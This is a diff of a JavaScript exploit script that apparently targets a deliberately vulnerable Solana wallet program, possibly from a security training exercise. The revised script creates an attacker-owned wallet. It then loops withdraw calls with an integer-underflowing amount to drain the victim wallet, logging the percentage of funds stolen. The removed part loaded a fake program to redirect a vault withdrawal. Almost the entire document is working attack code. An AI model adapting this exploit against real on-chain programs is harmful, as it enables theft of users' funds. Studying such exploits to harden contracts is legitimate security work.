@@ -5,22 +5,19 @@ const {
   Connection,
   sendAndConfirmTransaction,
   PublicKey,
-  BPF_LOADER_PROGRAM_ID,
-  BpfLoader,
+  SystemProgram,
 } = require("@solana/web3.js");
 
 const bs58 = require("bs58");
 const fs = require("fs");
-const process = require("process");
 
-const { Wallet } = require("wallet-v0");
-const { Exploit } = require("exploit");
+const { Wallet } = require("wallet-v1");
 
 const authorityPublicKey = new PublicKey(
   bs58.decode("7By5EKRWGRKD5eQSh582u3QPcyuYRi7Me5UHzJ4hvru4")
 );
 const walletProgramId = new PublicKey(
-  bs58.decode("9sLzyFBA8UzZpN2WHBN9pJpAwVZue7APWfaTZ5yfRFxE")
+  bs58.decode("13EYLEkRj1XgDpNxeKyDTRH3Rtn8xyQ5Qu8yXCjeDHhh")
 );
 
 console.log(`[*] Authority: ${authorityPublicKey}`);
@@ -35,7 +32,8 @@ let attackerSecretKey = Uint8Array.from([
   163, 191, 97, 101, 129, 245, 158, 22, 200, 191, 11, 23, 166, 6, 179, 225, 153,
   169, 233, 223, 178, 24, 145, 185, 167, 217, 137, 141, 54,
 ]);
-let attacker = Keypair.fromSecretKey(attackerSecretKey);
+//let attacker = Keypair.fromSecretKey(attackerSecretKey);
+let attacker = Keypair.generate();
 
 (async () => {
   // receive 'tiny' airdrop
@@ -52,65 +50,35 @@ let attacker = Keypair.fromSecretKey(attackerSecretKey);
     `[*] Previous balance of attacker: ${balancePrev / LAMPORTS_PER_SOL} SOL`
   );
 
-  // create fake wallet
-  const exploit = Keypair.generate();
-  const exploitId = exploit.publicKey;
-  const exploitCode = fs.readFileSync("./exploit.so");
-  {
-    const success = await BpfLoader.load(
-      connection,
-      attacker,
-      exploit,
-      exploitCode,
-      BPF_LOADER_PROGRAM_ID
-    );
-    if (!success) {
-      console.log("[!] Failed to load exploit program!");
-      throw "fail";
-    } else {
-      console.log("[+] Successfully loaded exploit program");
-    }
-  }
-  console.log(`[*] Exploit program address: ${exploitId}`);
-
-  // get vault address and set wallet data
   const [walletAddress, _walletBumpSeed] = PublicKey.findProgramAddressSync(
     [authorityPublicKey.toBytes()],
     walletProgramId
   );
-  const accountInfo = await connection.getAccountInfo(walletAddress);
-  const vaultAddress = new PublicKey(accountInfo.data.slice(32, 64));
-  const [fakeWalletPubkey, _seed] = PublicKey.findProgramAddressSync(
-    [attacker.publicKey.toBuffer()],
-    exploitId
-  );
+
   {
-    const ix = Exploit.exploitLevel0(
-      exploitId,
-      fakeWalletPubkey,
-      vaultAddress,
+    // initialize another wallet whose authority is attacker
+    const [ix1, attackerWalletAddress] = Wallet.initialize(
+      walletProgramId,
       attacker.publicKey
     );
-    const tx = new Transaction().add(ix);
-    await sendAndConfirmTransaction(connection, tx, [attacker]);
-  }
+    let tx1 = new Transaction().add(ix1);
+    await sendAndConfirmTransaction(connection, tx1, [attacker]);
+    console.log(`[+] Created a new wallet whose authority is attacker: ${attackerWalletAddress}`);
 
-  // send exploit TX
-  {
-    const withdrawAmount = await connection.getBalance(vaultAddress);
+    const withdrawAmount = await connection.getBalance(walletAddress);
     console.log(
       `[*] Amount of funds to steal: ${withdrawAmount / LAMPORTS_PER_SOL} SOL`
     );
-    const ix = Wallet.withdraw(
-      walletProgramId,
-      fakeWalletPubkey,
-      vaultAddress,
-      attacker.publicKey,
-      attacker.publicKey,
-      withdrawAmount
-    );
-    const tx = new Transaction().add(ix);
-    await sendAndConfirmTransaction(connection, tx, [attacker]);
+
+    // by using that wallet, drain funds using - amount
+    const walletRent = await connection.getMinimumBalanceForRentExemption(32);
+    for (var i = 0; i < withdrawAmount / walletRent; i++) {
+      let amtArg = (1n << 64n) - BigInt(walletRent);
+      const ix3 = Wallet.withdraw(walletProgramId, attackerWalletAddress, attacker.publicKey, walletAddress, amtArg);
+      let tx3 = new Transaction().add(ix3);
+      await sendAndConfirmTransaction(connection, tx3, [attacker]);
+      console.log(`[+] Attacker stole ${(walletRent * i / withdrawAmount * 100).toFixed(3)}% of wallet TVL`)
+    }
   }
 
   const balanceFinal = await connection.getBalance(attacker.publicKey);
